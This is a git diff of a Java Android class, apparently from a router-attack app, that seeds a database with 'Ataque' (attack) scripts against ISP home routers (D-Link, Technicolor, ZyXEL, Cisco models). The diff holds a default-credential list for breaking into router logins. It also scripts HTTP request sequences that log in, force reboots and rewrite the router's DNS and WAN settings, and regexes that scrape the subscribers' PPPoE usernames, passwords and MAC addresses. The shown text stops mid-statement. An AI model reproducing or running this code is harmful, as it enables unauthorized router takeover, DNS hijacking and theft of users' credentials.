@@ -20,7 +20,8 @@ public class Initialize {
 	private AtaqueDao mAtaqueDao;
 	private PostGetDao mPostGetDao;
 	private ParamsDao mParamsDao;
-	private UsuarioDao mUsuarioDao;
+	private ParamsProxDao mParamsProxDao;
+	private LoginDao mLoginDao;
 	
 	
 	public Initialize(Context mContext, SharedPreferences mShared) {
@@ -33,8 +34,9 @@ public class Initialize {
 		mDadoDao = new DadoDao(mContext);
 		mAtaqueDao = new AtaqueDao(mContext);
 		mPostGetDao = new PostGetDao(mContext);
-		mParamsDao = new ParamsDao(mContext);         
-		mUsuarioDao = new UsuarioDao(mContext);		
+		mParamsDao = new ParamsDao(mContext); 
+		mParamsProxDao = new ParamsProxDao(mContext);           
+		mLoginDao = new LoginDao(mContext);		
 
 		SharedPreferences.Editor editor = mShared.edit();
 		editor.putBoolean(TAG_CREATE_TABLES, true);
@@ -42,46 +44,47 @@ public class Initialize {
 
 		Log.i("CREATE_TABLES", "Tabelas criadas com sucesso");
 		
-		/*****PARA TESTE COMENTAR******/
+
+		/*****RETIRAR ISSO CASO O SERVIDOR ESTIVER NO AR*******/
 		insertAll();
 		selectAll();
-		/******************************/
+		/******************************************************/
 	}
 
 	public void insertAll() {	
-		mUsuarioDao.insert(new Login(1, "super", "@c&essoO1", "oi"));
-		mUsuarioDao.insert(new Login(2, "admin", "admin", "oi"));
-		mUsuarioDao.insert(new Login(3, "zqf5nw2x", "10931030", "net"));
-		mUsuarioDao.insert(new Login(4, "", "admin", "oi"));
-		mUsuarioDao.insert(new Login(5, "admin", "1234", "oi"));
-		mUsuarioDao.insert(new Login(6, "admin", "gvt12345", "gvt"));
-		mUsuarioDao.insert(new Login(7, "admin", "motorola", "net"));
-		mUsuarioDao.insert(new Login(8, "router", "router", "net"));
-		mUsuarioDao.insert(new Login(9, "cablecom", "router", "net"));
-		mUsuarioDao.insert(new Login(10, "", "admin", "oi"));
-		mUsuarioDao.insert(new Login(11, "", "Wireless", "oi"));
-		mUsuarioDao.insert(new Login(12, "Admin", "Admin", "oi"));
-		mUsuarioDao.insert(new Login(13, "Admin", "", "oi"));
-		mUsuarioDao.insert(new Login(14, "", "Admin", "oi"));
-		mUsuarioDao.insert(new Login(15, "Administrator", "Administrator", "oi"));
-		mUsuarioDao.insert(new Login(16, "Administrator", "", "oi"));
-		mUsuarioDao.insert(new Login(17, "", "Adminstrator", "oi"));
-		mUsuarioDao.insert(new Login(18, "root", "root", "oi"));
-		mUsuarioDao.insert(new Login(19, "root", "", "oi"));
-		mUsuarioDao.insert(new Login(20, "", "root", "oi"));
-		mUsuarioDao.insert(new Login(21, "admin", "password", "net"));
-		mUsuarioDao.insert(new Login(22, "", "1234", "oi"));
+		mLoginDao.insert(new Login(1, "super", "@c&essoO1", "oi"));
+		mLoginDao.insert(new Login(2, "admin", "admin", "oi"));
+		mLoginDao.insert(new Login(3, "", "", "net"));
+		mLoginDao.insert(new Login(4, "admin", "", "oi"));
+		mLoginDao.insert(new Login(5, "admin", "1234", "oi"));
+		mLoginDao.insert(new Login(6, "admin", "gvt12345", "gvt"));
+		mLoginDao.insert(new Login(7, "admin", "motorola", "net"));
+		mLoginDao.insert(new Login(8, "router", "router", "net"));
+		mLoginDao.insert(new Login(9, "cablecom", "", "net"));
+		mLoginDao.insert(new Login(10, "", "admin", "oi"));
+		mLoginDao.insert(new Login(11, "", "Wireless", "oi"));
+		mLoginDao.insert(new Login(12, "Admin", "Admin", "oi"));
+		mLoginDao.insert(new Login(13, "Admin", "", "oi"));
+		mLoginDao.insert(new Login(14, "", "Admin", "oi"));
+		mLoginDao.insert(new Login(15, "Administrator", "Administrator", "oi"));
+		mLoginDao.insert(new Login(16, "Administrator", "", "oi"));
+		mLoginDao.insert(new Login(17, "", "Administrator", "oi"));
+		mLoginDao.insert(new Login(18, "root", "root", "oi"));
+		mLoginDao.insert(new Login(19, "root", "", "oi"));
+		mLoginDao.insert(new Login(20, "", "root", "oi"));
+		mLoginDao.insert(new Login(21, "admin", "password", "net"));
+		mLoginDao.insert(new Login(22, "", "1234", "oi"));
 	
 		/*******************************************************Start Login*******************************************************/
 //		GVT D-Link DSL-2640B	
-		mAtaqueDao.insert(new Ataque(1, "login", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(1, "login", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(1, 1, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(2, 1, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(3, 1, 3, "get", "/menu.html", "mainMenuBody", 1));
 			mPostGetDao.insert(new PostGet(4, 1, 4, "get", "/info.html", "DSL-2640B", 1));
 		
 //		Oi technicolor TD5136v2 / TD5130v2	
-		mAtaqueDao.insert(new Ataque(2, "login", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(2, "login", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(5, 2, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(1, 5, "isSubmit", "1"));
 				mParamsDao.insert(new Params(2, 5, "username", "insereUsuario"));
@@ -92,7 +95,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(9, 2, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));	
 	
 //		Oi ZyXEL AMG1202-T10B
-		mAtaqueDao.insert(new Ataque(3, "login", "oi", 1, "ZyXEL AMG1202-T10B"));			
+		mAtaqueDao.insert(new Ataque(3, "login", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(10, 3, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(4, 10, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(5, 10, "LoginUsername", "insereUsuario"));
@@ -107,7 +110,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(19, 3, 10, "get", "/cgi-bin/path.asp", "", 0));
 		
 //		NET Cisco DPC3925
-		mAtaqueDao.insert(new Ataque(4, "login", "net", 1, "Cisco DPC3925"));			
+		mAtaqueDao.insert(new Ataque(4, "login", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(20, 4, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(6, 20, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(7, 20, "password_login", "insereSenha"));
@@ -121,7 +124,7 @@ public class Initialize {
 			
 		/******************************************************Start Reboot*******************************************************/	
 //		GVT D-Link DSL-2640B
-		mAtaqueDao.insert(new Ataque(5, "reboot", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(5, "reboot", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(22, 5, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(23, 5, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(24, 5, 3, "get", "/menu.html", "mainMenuBody", 1));
@@ -131,7 +134,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(28, 5, 7, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));
 	
 //		Oi technicolor TD5136v2 / TD5130v2	
-		mAtaqueDao.insert(new Ataque(6, "reboot", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(6, "reboot", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(29, 6, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(11, 29, "isSubmit", "1"));
 				mParamsDao.insert(new Params(12, 29, "username", "insereUsuario"));
@@ -147,7 +150,7 @@ public class Initialize {
 				mParamsDao.insert(new Params(15, 36, "submitValue", "apply"));
 	
 //		Oi ZyXEL AMG1202-T10B
-		mAtaqueDao.insert(new Ataque(7, "reboot", "oi", 1, "ZyXEL AMG1202-T10B"));			
+		mAtaqueDao.insert(new Ataque(7, "reboot", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(37, 7, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(16, 37, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(17, 37, "LoginUsername", "insereUsuario"));
@@ -166,7 +169,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(50, 7, 14, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));			
 	
 //		NET Cisco DPC3925
-		mAtaqueDao.insert(new Ataque(8, "reboot", "net", 1, "Cisco DPC3925"));			
+		mAtaqueDao.insert(new Ataque(8, "reboot", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(51, 8, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(18, 51, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(19, 51, "password_login", "insereSenha"));
@@ -188,7 +191,7 @@ public class Initialize {
 			
 		/********************************************************Start DNS********************************************************/	
 //		GVT D-Link DSL-2640B
-		mAtaqueDao.insert(new Ataque(9, "dns", "gvt", 0, "D-Link DSL-2640B"));
+		mAtaqueDao.insert(new Ataque(9, "dns", "gvt", 0, 0, null, 1, "D-Link DSL-2640B"));
 			mPostGetDao.insert(new PostGet(57, 9, 1, "get", "", "DSL Router", 1));
 			mPostGetDao.insert(new PostGet(58, 9, 2, "get", "/logo.html", "logoBody", 1));
 			mPostGetDao.insert(new PostGet(59, 9, 3, "get", "/menu.html", "mainMenuBody", 1));
@@ -202,7 +205,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(67, 9, 11, "get", "/rebootinfo.cgi", "The DSL Router is rebooting", 1));
 			
 //		Oi technicolor TD5136v2	/ TD5130v2	
-		mAtaqueDao.insert(new Ataque(10, "dns", "oi", 1, "technicolor TD5136v2 / TD5130v2"));
+		mAtaqueDao.insert(new Ataque(10, "dns", "oi", 1, 0, null, 0, "technicolor TD5136v2 / TD5130v2"));
 			mPostGetDao.insert(new PostGet(68, 10, 1, "post", "/login.cgi", "/index.cgi", 1));		
 				mParamsDao.insert(new Params(27, 68, "isSubmit", "1"));
 				mParamsDao.insert(new Params(28, 68, "username", "insereUsuario"));
@@ -211,32 +214,38 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(70, 10, 3, "get", "/top.cgi", "Welcome to WEB Configuration", 0));	
 			mPostGetDao.insert(new PostGet(71, 10, 4, "get", "/code.cgi", "SETUP WIZARD", 0));	
 			mPostGetDao.insert(new PostGet(72, 10, 5, "get", "/status_summary.cgi?pageAct=summary", "Firmware Version", 0));
-			mPostGetDao.insert(new PostGet(73, 10, 6, "get", "/wancfg.cgi?tAction=view&idx=0", "document.tF_DSL.Profile_Name.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_AutoPVCEnabled.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_VPI.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_VCI.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_Encapsulation.value=\"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_ATMQoS.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.DSL_ATMPeakCellRate.value=\"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_Enable.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_Name.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_NATEnabled.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_UserName.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_UserPassword.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_ConfirmPassword.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_MaxMRUSize.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_PPPoEServiceName.value = \"(.*?)\";;" +
-																							   "Lan_Mac = \"(.*?)\";;" +
-																							   "document.tF_DSL.PPP_LCP_Interval.value=\"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Enable.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Name.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_NATEnabled.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_AddressingType.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_MaxMTUSize.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Option_125.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Option_60_Vendor_ID.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Option_61_IAID.value = \"(.*?)\";;" +
-																							   "document.tF_DSL.IP_Option_61_DUID.value = \"(.*?)\";;", 0));
+			mPostGetDao.insert(new PostGet(73, 10, 6, "get", "/wancfg.cgi?tAction=view&idx=0", "", 0));
+					mParamsProxDao.insert(new Params(1, 73, "Profile_Name", "document.tF_DSL.Profile_Name.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(2, 73, "DSL_AutoPVCEnabled", "document.tF_DSL.DSL_AutoPVCEnabled.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(3, 73, "DSL_VPI", "document.tF_DSL.DSL_VPI.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(4, 73, "DSL_VCI", "document.tF_DSL.DSL_VCI.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(5, 73, "DSL_Encapsulation", "document.tF_DSL.DSL_Encapsulation.value=\"(.*?)\""));
+					mParamsProxDao.insert(new Params(6, 73, "DSL_ATMQoS", "document.tF_DSL.DSL_ATMQoS.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(7, 73, "DSL_ATMPeakCellRate", "document.tF_DSL.DSL_ATMPeakCellRate.value=\"(.*?)\""));
+					mParamsProxDao.insert(new Params(8, 73, "PPP_Enable", "document.tF_DSL.PPP_Enable.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(9, 73, "PPP_Name", "document.tF_DSL.PPP_Name.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(10, 73, "PPP_NATEnabled", "document.tF_DSL.PPP_NATEnabled.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(11, 73, "PPP_UserName", "document.tF_DSL.PPP_UserName.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(12, 73, "PPP_UserPassword", "document.tF_DSL.PPP_UserPassword.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(13, 73, "PPP_ConfirmPassword", "document.tF_DSL.PPP_ConfirmPassword.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(14, 73, "PPP_MaxMRUSize", "document.tF_DSL.PPP_MaxMRUSize.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(15, 73, "PPP_PPPoEServiceName", "document.tF_DSL.PPP_PPPoEServiceName.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(16, 73, "Lan_Mac0-2", "Lan_Mac = \"(.*?):[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}\""));
+					mParamsProxDao.insert(new Params(17, 73, "Lan_Mac3-5", "Lan_Mac = \"[0-9A-F]{2}:(.*?):[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}\""));
+					mParamsProxDao.insert(new Params(18, 73, "Lan_Mac6-8", "Lan_Mac = \"[0-9A-F]{2}:[0-9A-F]{2}:(.*?):[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}\""));
+					mParamsProxDao.insert(new Params(19, 73, "Lan_Mac9-11", "Lan_Mac = \"[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:(.*?):[0-9A-F]{2}:[0-9A-F]{2}\""));
+					mParamsProxDao.insert(new Params(20, 73, "Lan_Mac12-14", "Lan_Mac = \"[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:(.*?):[0-9A-F]{2}\""));
+					mParamsProxDao.insert(new Params(21, 73, "Lan_Mac15-17", "Lan_Mac = \"[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:(.*?)\""));
+					mParamsProxDao.insert(new Params(22, 73, "PPP_LCP_Interval", "document.tF_DSL.PPP_LCP_Interval.value=\"(.*?)\""));
+					mParamsProxDao.insert(new Params(23, 73, "IP_Enable", "document.tF_DSL.IP_Enable.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(24, 73, "IP_Name", "document.tF_DSL.IP_Name.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(25, 73, "IP_NATEnabled", "document.tF_DSL.IP_NATEnabled.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(26, 73, "IP_AddressingType", "document.tF_DSL.IP_AddressingType.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(27, 73, "IP_MaxMTUSize", "document.tF_DSL.IP_MaxMTUSize.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(28, 73, "IP_Option_125", "document.tF_DSL.IP_Option_125.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(29, 73, "IP_Option_60_Vendor_ID", "document.tF_DSL.IP_Option_60_Vendor_ID.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(30, 73, "IP_Option_61_IAID", "document.tF_DSL.IP_Option_61_IAID.value = \"(.*?)\""));
+					mParamsProxDao.insert(new Params(31, 73, "IP_Option_61_DUID", "document.tF_DSL.IP_Option_61_DUID.value = \"(.*?)\""));
 			mPostGetDao.insert(new PostGet(74, 10, 7, "get", "/wancfg.cgi?tAction=apply&idx=0" +
 																						"&natEnable=1" +
 																						"&defaultRoute=1" +
@@ -256,16 +265,16 @@ public class Initialize {
 																						"&wanMode=1" +
 																						"&wanMac=" +
 																						"&unnumberMode=0" +
-																						"&Profile_Name=inseredocument.tF_DSL.Profile_Name.value" +		//PVC0
+																						"&Profile_Name=insereProfile_Name" +		//PVC0
 																						"&pvcId=0" +
 																						"&DSL_Enable=1" +
-																						"&DSL_AutoPVCEnabled=inseredocument.tF_DSL.DSL_AutoPVCEnabled.value" +		//1
-																						"&DSL_VPI=inseredocument.tF_DSL.DSL_VPI.value" +		//0
-																						"&DSL_VCI=inseredocument.tF_DSL.DSL_VCI.value" +		//33
+																						"&DSL_AutoPVCEnabled=insereDSL_AutoPVCEnabled" +		//1
+																						"&DSL_VPI=insereDSL_VPI" +		//0
+																						"&DSL_VCI=insereDSL_VCI" +		//33
 																						"&DSL_LinkType=0" +
-																						"&DSL_Encapsulation=inseredocument.tF_DSL.DSL_Encapsulation.value" +		//1
-																						"&DSL_ATMQoS=inseredocument.tF_DSL.DSL_ATMQoS.value" +		//0
-																						"&DSL_ATMPeakCellRate=inseredocument.tF_DSL.DSL_ATMPeakCellRate.value" +		//6000
+																						"&DSL_Encapsulation=insereDSL_Encapsulation" +		//1
+																						"&DSL_ATMQoS=insereDSL_ATMQoS" +		//0
+																						"&DSL_ATMPeakCellRate=insereDSL_ATMPeakCellRate" +		//6000
 																						"&DSL_ATMMaxmumBurstSize=0" +
 																						"&DSL_ATMSustainableCellRate=0" +
 																						"&DSL_EnableVlan=0" +
@@ -274,21 +283,21 @@ public class Initialize {
 																						"&bridgeType=2" +
 																						"&igmpEnabled=0" +
 																						"&mode=1" +
-																						"&PPP_Enable=inseredocument.tF_DSL.PPP_Enable.value" +		//1
+																						"&PPP_Enable=inserePPP_Enable" +		//1
 																						"&PPP_IPversion=0" +
 																						"&PPP_IPMode=1" +
 																						"&PPP_IPAddress=0.0.0.0" +
-																						"&PPP_Name=inseredocument.tF_DSL.PPP_Name.value" +		//WAN1
-																						"&PPP_NATEnabled=inseredocument.tF_DSL.PPP_NATEnabled.value" +		//1
-																						"&PPP_UserName=inseredocument.tF_DSL.PPP_UserName.value" +		//B0C287467712@oivelox
-																						"&PPP_UserPassword=inseredocument.tF_DSL.PPP_UserPassword.value" +		//B0C287467712
-																						"&PPP_ConfirmPassword=inseredocument.tF_DSL.PPP_ConfirmPassword.value" +		//B0C287467712
-																						"&PPP_MaxMRUSize=inseredocument.tF_DSL.PPP_MaxMRUSize.value" +		//1492
+																						"&PPP_Name=inserePPP_Name" +		//WAN1
+																						"&PPP_NATEnabled=inserePPP_NATEnabled" +		//1
+																						"&PPP_UserName=inserePPP_UserName" +		//B0C287467712@oivelox
+																						"&PPP_UserPassword=inserePPP_UserPassword" +		//B0C287467712
+																						"&PPP_ConfirmPassword=inserePPP_ConfirmPassword" +		//B0C287467712
+																						"&PPP_MaxMRUSize=inserePPP_MaxMRUSize" +		//1492
 																						"&PPP_DNSEnabled=1" +
 																						"&PPP_DNSOverrideAllowed=0" +
 																						"&PPP_DNSServer1=8.8.8.8" +
 																						"&PPP_DNSServer2=8.8.4.4" +
-																						"&PPP_PPPoEServiceName=inseredocument.tF_DSL.PPP_PPPoEServiceName.value" +		//
+																						"&PPP_PPPoEServiceName=inserePPP_PPPoEServiceName" +		//
 																						"&PPP_MACAddress1=insereLan_Mac0-2" +		//B0
 																						"&PPP_MACAddress2=insereLan_Mac3-5" +		//C2
 																						"&PPP_MACAddress3=insereLan_Mac6-8" +		//87
@@ -296,39 +305,39 @@ public class Initialize {
 																						"&PPP_MACAddress5=insereLan_Mac12-14" +		//77
 																						"&PPP_MACAddress6=insereLan_Mac15-17" +		//12
 																						"&PPP_PPPoEACName=" +
-																						"&PPP_LCP_Interval=inseredocument.tF_DSL.PPP_LCP_Interval.value" +		//10
+																						"&PPP_LCP_Interval=inserePPP_LCP_Interval" +		//10
 																						"&PPP_DefaultRoute=0" +
-																						"&IP_Enable=inseredocument.tF_DSL.IP_Enable.value" +		//1
+																						"&IP_Enable=insereIP_Enable" +		//1
 																						"&IP_IPversion=0" +
-																						"&IP_Name=inseredocument.tF_DSL.IP_Name.value" +
+																						"&IP_Name=insereIP_Name" +
 																						"&IP_ConnectionType=2" +
-																						"&IP_NATEnabled=inseredocument.tF_DSL.IP_NATEnabled.value" +		//1
-																						"&IP_AddressingType=inseredocument.tF_DSL.IP_AddressingType.value" +		//1
+																						"&IP_NATEnabled=insereIP_NATEnabled" +		//1
+																						"&IP_AddressingType=insereIP_AddressingType" +		//1
 																						"&IP_ExternalIPAddress=0.0.0.0" +
 																						"&IP_SubNetMask=0.0.0.0" +
 																						"&IP_DefaultGateway=0.0.0.0" +
 																						"&IP_DNSEnabled=0" +
 																						"&IP_DNSOverrideAllowed=0" +
-																						"&IP_MaxMTUSize=inseredocument.tF_DSL.IP_MaxMTUSize.value" +		//1492
+																						"&IP_MaxMTUSize=insereIP_MaxMTUSize" +		//1492
 																						"&IP_MACAddress1=insereLan_Mac0-2" +		//B0
 																						"&IP_MACAddress2=insereLan_Mac3-5" +		//C2
 																						"&IP_MACAddress3=insereLan_Mac6-8" +		//87
 																						"&IP_MACAddress4=insereLan_Mac9-11" +		//46
 																						"&IP_MACAddress5=insereLan_Mac12-14" +		//77
 																						"&IP_MACAddress6=insereLan_Mac15-17" +		//12
-																						"&IP_Option_125=inseredocument.tF_DSL.IP_Option_125.value" +		//0
-																						"&IP_Option_60_Vendor_ID=inseredocument.tF_DSL.IP_Option_60_Vendor_ID.value" +		//
-																						"&IP_Option_61_IAID=inseredocument.tF_DSL.IP_Option_61_IAID.value" +		//
-																						"&IP_Option_61_DUID=inseredocument.tF_DSL.IP_Option_61_DUID.value" +		//
+																						"&IP_Option_125=insereIP_Option_125" +		//0
+																						"&IP_Option_60_Vendor_ID=insereIP_Option_60_Vendor_ID" +		//
+																						"&IP_Option_61_IAID=insereIP_Option_61_IAID" +		//
+																						"&IP_Option_61_DUID=insereIP_Option_61_DUID" +		//
 																						"&IP_DefaultRoute=0", "", 0));
 			mPostGetDao.insert(new PostGet(75, 10, 8, "get", "/reboot.cgi", "want to reboot the device", 0));
 			mPostGetDao.insert(new PostGet(76, 10, 9, "post", "/reboot.cgi", "System rebooting", 0));
-			mParamsDao.insert(new Params(30, 76, "submitValue", "redirect"));						
+				mParamsDao.insert(new Params(30, 76, "submitValue", "redirect"));						
 			mPostGetDao.insert(new PostGet(77, 10, 10, "post", "/reboot.cgi", "", 0));		//TIMEOUT	
-			mParamsDao.insert(new Params(31, 77, "submitValue", "apply"));
+				mParamsDao.insert(new Params(31, 77, "submitValue", "apply"));
 			
 //		Oi ZyXEL AMG1202-T10B
-		mAtaqueDao.insert(new Ataque(11, "dns", "oi", 1, "ZyXEL AMG1202-T10B"));			
+		mAtaqueDao.insert(new Ataque(11, "dns", "oi", 1, 0, null, 0, "ZyXEL AMG1202-T10B"));			
 			mPostGetDao.insert(new PostGet(78, 11, 1, "post", "/cgi-bin/SavingAuthorize.asp", "/MakeSession.asp", 1));												
 				mParamsDao.insert(new Params(32, 78, "LoginPassword", "insereSenha"));
 				mParamsDao.insert(new Params(33, 78, "LoginUsername", "insereUsuario"));
@@ -342,14 +351,15 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(86, 11, 9, "get", "/cgi-bin/buttom.asp", "", 0));		
 			mPostGetDao.insert(new PostGet(87, 11, 10, "get", "/cgi-bin/LAN_IP.asp", "", 0));		
 			mPostGetDao.insert(new PostGet(88, 11, 11, "get", "/cgi-bin/buttom.asp", "", 0));		
-			mPostGetDao.insert(new PostGet(89, 11, 12, "get", "/cgi-bin/LAN_DHCPSetup.asp", "<input type=\"hidden\" Name=\"IPAliasExist\" value=\"(.*?)\">;;" +
-																							"<INPUT type=\"hidden\" NAME=\"IPAlias1Addr\" value=\"(.*?)\">;;" +
-																							"<input type=\"hidden\" name=\"IPAlias1SubnetMask\" value=\"(.*?)\">;;" +																			
-																							"<input type=\"text\" name=\"sysPoolStartingAddr\" size=\"15\" maxlength=\"15\" value=\"(.*?)\">;;" +
-																							"<input type=\"hidden\" name=\"ipAddrMain\" value=\"(.*?)\">;;" + 
-																							"<input type=\"hidden\" name=\"subnetMask\" value=\"(.*?)\">;;" +
-																							"<input type=\"text\" name=\"sysPoolCount\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" onKeyPress=\"chk_num\\(event\\)\">;;" +
-																							"<input type=\"hidden\" name=\"DNSproxy\" value=\"(.*?)\">;;", 0));
+			mPostGetDao.insert(new PostGet(89, 11, 12, "get", "/cgi-bin/LAN_DHCPSetup.asp", "", 0));
+					mParamsProxDao.insert(new Params(32, 89, "IPAliasExist", "<input type=\"hidden\" Name=\"IPAliasExist\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(33, 89, "IPAlias1Addr", "<INPUT type=\"hidden\" NAME=\"IPAlias1Addr\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(34, 89, "IPAlias1SubnetMask", "<input type=\"hidden\" name=\"IPAlias1SubnetMask\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(35, 89, "sysPoolStartingAddr", "<input type=\"text\" name=\"sysPoolStartingAddr\" size=\"15\" maxlength=\"15\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(36, 89, "ipAddrMain", "<input type=\"hidden\" name=\"ipAddrMain\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(37, 89, "subnetMask", "<input type=\"hidden\" name=\"subnetMask\" value=\"(.*?)\">"));
+					mParamsProxDao.insert(new Params(38, 89, "sysPoolCount", "<input type=\"text\" name=\"sysPoolCount\" size=\"3\" maxlength=\"3\" value=\"(.*?)\" onKeyPress=\"chk_num\\(event\\)\">"));
+					mParamsProxDao.insert(new Params(39, 89, "DNSproxy", "<input type=\"hidden\" name=\"DNSproxy\" value=\"(.*?)\">"));			
 			mPostGetDao.insert(new PostGet(90, 11, 13, "get", "/cgi-bin/buttom.asp", "", 0));
 			mPostGetDao.insert(new PostGet(91, 11, 14, "post", "/cgi-bin/LAN_DHCPSetup.asp", "", 0));											
 				mParamsDao.insert(new Params(34, 91, "IPAliasExist", "insereIPAliasExist"));		//Yes	
@@ -375,7 +385,7 @@ public class Initialize {
 			mPostGetDao.insert(new PostGet(97, 11, 20, "get", "/cgi-bin/RebootSucc.asp", "The device is rebooting", 0));			
 
 //		NET Cisco DPC3925			
-		mAtaqueDao.insert(new Ataque(12, "dns", "net", 1, "Cisco DPC3925"));			
+		mAtaqueDao.insert(new Ataque(12, "dns", "net", 1, 0, null, 0, "Cisco DPC3925"));			
 			mPostGetDao.insert(new PostGet(98, 12, 1, "post", "/goform/Docsis_system", "Setup", 1));														
 				mParamsDao.insert(new Params(49, 98, "username_login", "insereUsuario"));
 				mParamsDao.insert(new Params(50, 98, "password_login", "insereSenha"));
@@ -383,20 +393,21 @@ public class Initialize {
 				mParamsDao.insert(new Params(52, 98, "Language_Submit", "0"));
 				mParamsDao.insert(new Params(53, 98, "login", "Log In"));
 			mPostGetDao.insert(new PostGet(99, 12, 2, "get", "/Quick_setup.asp", "Quick Setup", 0));
-			mPostGetDao.insert(new PostGet(100, 12, 3, "get", "/LanSetup.asp", "<input name=\"CiscoLocalIpAddressIP2\" title=\"Local IP Address Third Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
-																				"<input name=\"CiscoLocalIpAddressIP3\" title=\"Local IP Address Fourth Octet\" type=\"text\" class=\"ipnum\" value=\"(.*?)\" size=\"3\" maxlength=\"3\" />;;" +
